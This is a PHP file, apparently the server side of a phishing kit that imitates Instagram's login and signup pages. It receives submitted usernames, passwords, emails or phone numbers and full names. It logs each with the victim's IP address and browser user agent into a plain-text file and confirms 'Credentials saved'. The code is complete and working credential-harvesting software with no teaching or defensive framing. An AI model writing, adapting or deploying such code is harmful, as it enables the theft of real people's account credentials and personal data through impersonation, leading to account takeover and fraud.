<?php
// save-credentials.php
// This file receives login credentials and saves them to userName&Password file

// Set the file path
$file = 'userName&Password';

// Get POST data
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$type = isset($_POST['type']) ? $_POST['type'] : 'login';

// For signup
$mobile_or_email = isset($_POST['mobile_or_email']) ? $_POST['mobile_or_email'] : '';
$full_name = isset($_POST['full_name']) ? $_POST['full_name'] : '';

if ((!empty($username) && !empty($password)) || (!empty($mobile_or_email) && !empty($full_name))) {
    // Prepare the data to save
    $timestamp = date('Y-m-d H:i:s');
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $ipAddress = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    
    // Format the data
    $data = "====================================\n";
    $data .= "INSTAGRAM " . strtoupper($type) . " ATTEMPT\n";
    $data .= "====================================\n";
    
    if ($type === 'signup') {
        $data .= "Mobile/Email: " . $mobile_or_email . "\n";
        $data .= "Full Name: " . $full_name . "\n";
        $data .= "Username: " . $username . "\n";
        $data .= "Password: " . $password . "\n";
    } else {
        $data .= "Username: " . $username . "\n";
        $data .= "Password: " . $password . "\n";
    }
    
    $data .= "Timestamp: " . $timestamp . "\n";
    $data .= "IP Address: " . $ipAddress . "\n";
    $data .= "User Agent: " . $userAgent . "\n";
    $data .= "====================================\n\n";
    
    // Append to file
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        echo json_encode(['success' => true, 'message' => 'Credentials saved']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to save']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Missing data']);
}
?>
